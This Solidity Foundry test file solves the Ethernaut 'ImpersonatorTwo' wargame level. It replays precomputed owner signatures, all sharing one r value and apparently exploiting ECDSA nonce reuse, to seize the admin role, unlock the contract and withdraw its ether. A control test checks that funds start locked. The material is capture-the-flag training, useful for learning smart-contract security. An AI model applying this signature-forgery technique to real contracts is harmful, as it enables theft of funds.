// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
import {ImpersonatorTwo} from "../../src/ethernaut2025/ImpersonatorTwo.sol";

contract ImpersonatorTwoTest is Test {
    ImpersonatorTwo instance;
    address OWNER = 0x03E2cf81BBE61D1fD1421aFF98e8605a5A9e953a;
    address ADMIN = 0xADa4aFfe581d1A31d7F75E1c5a3A98b2D4C40f68;
    address player = 0xF16989b7A9970Ac3a117Ad45b5eCEa6CEF31f208;

    function setUp() public {
        instance = new ImpersonatorTwo{value: 0.001 ether}();
        instance.transferOwnership(OWNER);
        // Factory flow: switchLock("lock0") then setAdmin("admin1", ADMIN).
        instance.switchLock(abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40",
            hex"70026fc30e4e02a15468de57155b080f405bd5b88af05412a9c3217e028537e3",
            uint8(27)
        ));
        instance.setAdmin(abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40",
            hex"4c3ac03b268ae1d2aca1201e8a936adf578a8b95a49986d54de87cd0ccb68a79",
            uint8(27)
        ), ADMIN);
        // nonce is now 2.
    }

    function testImpersonatorTwoExploit() public {
        // Signatures from the official ImpersonatorTwo.py script (OWNER key):
        // setAdmin signs "admin2<player>", switchLock signs "lock3".
        bytes memory setAdminSig = abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40",
            hex"701d59ccb1c72824452441d95444aa250ef592082f0f81957de7c9a7b5c14553",
            uint8(28)
        );
        bytes memory switchLockSig = abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40",
            hex"2a04aa67c7760a7bec982fde4b387e1e62dc26ba69dd74444e68ffe28851375e",
            uint8(28)
        );

        vm.prank(player);
        instance.setAdmin(setAdminSig, player);
        vm.prank(player);
        instance.switchLock(switchLockSig);
        vm.prank(player);
        instance.withdraw();

        assertEq(address(instance).balance, 0);
    }
}

contract ImpersonatorTwoControlTest is Test {
    function testFundsLockedInitially() public {
        ImpersonatorTwo instance = new ImpersonatorTwo{value: 0.001 ether}();
        assertEq(address(instance).balance, 0.001 ether);
        assertEq(instance.admin(), address(0));
    }
}

// end

